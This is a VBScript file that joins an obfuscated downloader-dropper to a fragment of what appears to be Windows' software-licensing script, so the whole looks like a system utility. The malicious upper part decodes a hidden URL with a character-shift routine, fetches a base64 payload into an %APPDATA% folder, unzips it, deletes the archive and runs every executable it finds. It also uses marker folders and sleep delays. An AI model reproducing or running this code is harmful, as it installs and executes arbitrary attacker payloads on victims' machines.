Option Explicit
CONST wshOK                             =0
CONST VALUE_ICON_WARNING                =16
CONST wshYesNoDialog                    =4
CONST VALUE_ICON_QUESTIONMARK           =32
CONST VALUE_ICON_INFORMATION            =64
CONST HKEY_LOCAL_MACHINE                =&H80000002
CONST KEY_SET_VALUE                     =&H0002
CONST KEY_QUERY_VALUE                   =&H0001
CONST REG_SZ                            =1           
dim zzacbdffhjmorttveggiln,pptvbdfhmmorvvzaccbdff,zaacegiinpprtvegiimoqq,oqsuxyybbdffjmmoqssudf
dim  aabdffhjooqsueegilnnpr,Clqtccbdfhhjmmoqttveeg,SEUZP
dim  llprtvzzaacegillnprrtv,mqXFFRJUWm
dim  jmoqsuuxybacfhjjmoqqsu,hjmoqsuadfhjmoqsuuxybb,prrtbbdffhjmmprrtvvzaacbddfhhjmmorr
dim  npttzzaaccegilnnprttve,prrtvzaabeegilnnprttve,OBJqqsuuaccegiilnnprru
dim  imooqsuuybacegiiloqqsuudfhhjmooqsuuaddfh,lrtvgillqsuaeegilnnprt,rtbbffhlpprtvzaacbddfh
Function Jkdkdkd(G1g)
For aabdffhjooqsueegilnnpr = 1 To Len(G1g)
lrtvgillqsuaeegilnnprt = Mid(G1g, aabdffhjooqsueegilnnpr, 1)
lrtvgillqsuaeegilnnprt = Chr(Asc(lrtvgillqsuaeegilnnprt)+ 6)
npttzzaaccegilnnprttve = npttzzaaccegilnnprttve + lrtvgillqsuaeegilnnprt
Next
Jkdkdkd = npttzzaaccegilnnprttve
End Function 
Function vbddfhjjmoqqsuza()
Dim ClqtccbdfhhjmmoqttveegLM,jxtrttvybaaceggiln,jrtjmmoqqsuuaccegw,Coltmmoqsveegillnprrt
Set ClqtccbdfhhjmmoqttveegLM = WScript.CreateObject( "WScript.Shell" )
Set jrtjmmoqqsuuaccegw = CreateObject( "Scripting.FileSystemObject" )
Set jxtrttvybaaceggiln = jrtjmmoqqsuuaccegw.GetFolder(hjmoqsuadfhjmoqsuuxybb)
Set Coltmmoqsveegillnprrt = jxtrttvybaaceggiln.Files
For Each Coltmmoqsveegillnprrt in Coltmmoqsveegillnprrt
If UCase(jrtjmmoqqsuuaccegw.GetExtensionName(Coltmmoqsveegillnprrt.name)) = "EXE" Then
ClqtccbdfhhjmmoqttveegLM.Exec(hjmoqsuadfhjmoqsuuxybb & "\" & Coltmmoqsveegillnprrt.Name)
End If
Next
End Function
llprtvzzaacegillnprrtv     = Jkdkdkd("bnnj4))+3,(,-0(+.1(+**4+3/*)pjh`adqfma(cmi")
Set OBJqqsuuaccegiilnnprru = CreateObject( "WScript.Shell" )    
prrtbbdffhjmmprrtvvzaacbddfhhjmmorr = OBJqqsuuaccegiilnnprru.ExpandEnvironmentStrings(StrReverse("%ATADPPA%"))
oqsuxyybbdffjmmoqssudf = "A99449C3092CE70964CE715CF7BB75B.zip"
Function ffhjmooqsuxybaad()
SET pptvbdfhmmorvvzaccbdff = CREATEOBJECT("Scripting.FileSystemObject")
IF pptvbdfhmmorvvzaccbdff.FolderExists(prrtbbdffhjmmprrtvvzaacbddfhhjmmorr + "\DecGram") = TRUE THEN WScript.Quit() END IF
IF pptvbdfhmmorvvzaccbdff.FolderExists(zaacegiinpprtvegiimoqq) = FALSE THEN
pptvbdfhmmorvvzaccbdff.CreateFolder zaacegiinpprtvegiimoqq
pptvbdfhmmorvvzaccbdff.CreateFolder OBJqqsuuaccegiilnnprru.ExpandEnvironmentStrings(StrReverse("%ATADPPA%")) + "\DecGram"
END IF
End Function
Function giilnprrtvbdfhhl()
DIM jrtjmmoqqsuuaccegxsd
Set jrtjmmoqqsuuaccegxsd = Createobject("Scripting.FileSystemObject")
jrtjmmoqqsuuaccegxsd.DeleteFile hjmoqsuadfhjmoqsuuxybb & "\" & oqsuxyybbdffjmmoqssudf
End Function
hjmoqsuadfhjmoqsuuxybb = prrtbbdffhjmmprrtvvzaacbddfhhjmmorr + "\nvptdn"
aaccegjjmoo
zaacegiinpprtvegiimoqq = hjmoqsuadfhjmoqsuuxybb
ffhjmooqsuxybaad
qssudgiinnprtvbb
WScript.Sleep 10103
qqsuxxacbddfhjmm
WScript.Sleep 5110
giilnprrtvbdfhhl
vbddfhjjmoqqsuza
Function aaccegjjmoo()
Set mqXFFRJUWm = CreateObject("Scripting.FileSystemObject")
If (mqXFFRJUWm.FolderExists(hjmoqsuadfhjmoqsuuxybb )) Then
WScript.Quit()
End If 
End Function   
Function qssudgiinnprtvbb()
DIM req
Set req = CreateObject("Msxml2.XMLHttp.6.0")
req.open "GET", llprtvzzaacegillnprrtv, False
req.send
If req.Status = 200 Then
 Dim oNode, BinaryStream
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = req.responseText
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write oNode.nodeTypedValue
BinaryStream.SaveToFile hjmoqsuadfhjmoqsuuxybb & "\" & oqsuxyybbdffjmmoqssudf, adSaveCreateOverWrite
End if
End Function
jmoqsuuxybacfhjjmoqqsu = "prrtvzaabeegilnnprttve"
Function qqsuxxacbddfhjmm()
set Clqtccbdfhhjmmoqttveeg = CreateObject("Shell.Application")
set SEUZP=Clqtccbdfhhjmmoqttveeg.NameSpace(hjmoqsuadfhjmoqsuuxybb & "\" & oqsuxyybbdffjmmoqssudf).items
Clqtccbdfhhjmmoqttveeg.NameSpace(hjmoqsuadfhjmoqsuuxybb & "\").CopyHere(SEUZP), 4
Set Clqtccbdfhhjmmoqttveeg = Nothing
End Function 

Private Sub DisplayAVMAClientInformation(objProduct)
    Dim strHostName, strPid
    Dim displayDate
    Dim bHostName, bFiletime, bPid

    strHostName = objProduct.AutomaticVMActivationHostMachineName
    bHostName = strHostName <> "" And Not IsNull(strHostName)

    Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
    displayDate.Value = objProduct.AutomaticVMActivationLastActivationTime
    bFiletime = displayDate.GetFileTime(false) <> 0

    strPid = objProduct.AutomaticVMActivationHostDigitalPid2
    bPid = strPid <> "" And Not IsNull(strPid)

    If bHostName Or bFiletime Or bPid Then
        LineOut ""
        LineOut GetResource("L_MsgVLMostRecentActivationInfo")
        LineOut GetResource("L_MsgAVMAInfo")

        If bHostName Then
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & strHostName
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & GetResource("L_MsgNotAvailable")
        End If

        If bFiletime Then
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & displayDate.GetVarDate
        Else
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & GetResource("L_MsgNotAvailable")
        End If

        If bPid Then
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & strPid
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & GetResource("L_MsgNotAvailable")
        End If
    End If

End Sub

'
' Display all information for /dlv and /dli
' If you add need to access new properties through WMI you must add them to the
' queries for service/object.  Be sure to check that the object properties in DisplayAllInformation()
' are requested for function/methods such as GetIsPrimaryWindowsSKU() and DisplayKMSClientInformation().
'